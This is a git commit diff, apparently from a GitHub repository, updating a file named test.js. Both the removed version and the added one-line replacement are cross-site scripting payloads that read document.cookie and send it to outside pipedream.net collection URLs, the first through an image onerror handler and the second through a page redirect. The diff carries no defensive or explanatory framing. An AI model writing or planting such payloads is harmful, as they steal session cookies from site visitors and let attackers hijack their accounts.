d2288cd3d839cf8b08db0e0885942d2339c8e20f
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-24 17:00:20 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,14 +1,1 @@
-document.addEventListener("DOMContentLoaded", function() {
-  const img = document.createElement('img');
-  img.id = 'myImg';
-  img.src = '../reverese.PNG/img.jpg'; // Replace with your image source
-  
-  // Append the image to the body (or another container)
-  document.body.appendChild(img);
-  alert('5');
-  
-  // Set the onerror handler
-  img.onerror = function() {
-    this.src = 'http://eo7u1nl20laxhkt.m.pipedream.net?cookie=' + document.cookie;
-  };
-});
+window.location="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
